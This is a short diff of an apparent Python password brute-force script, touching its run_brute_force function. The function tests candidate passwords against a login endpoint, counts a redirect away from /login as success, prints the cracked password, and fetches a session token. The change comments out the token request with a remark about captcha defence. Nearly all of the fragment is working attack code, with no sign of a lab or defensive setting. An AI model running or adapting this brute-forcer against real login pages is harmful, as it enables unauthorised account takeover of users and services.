@@ -59,13 +59,15 @@ def run_brute_force():
 
             if ((r.status_code == 302 and "/login" not in r.headers.get("Location", "") ) or sent == 50000):
                     print(f"[+] Found correct password for {username}: {pwd}")
+
+                    ''' ONLY IN CASE OF CAPTCHA DEFENCE
                     token_response = session.get(CAP_URL)
                     
                     if token_response.status_code == 200:
                         print(f"[SUCCESS] Token received for {username}: {token_response.text[:24]}...")
                     else:
                         print(f"[!] Logged in but failed to get token. Status: {token_response.status_code}")
-                    
+                    '''
                     break
             
 
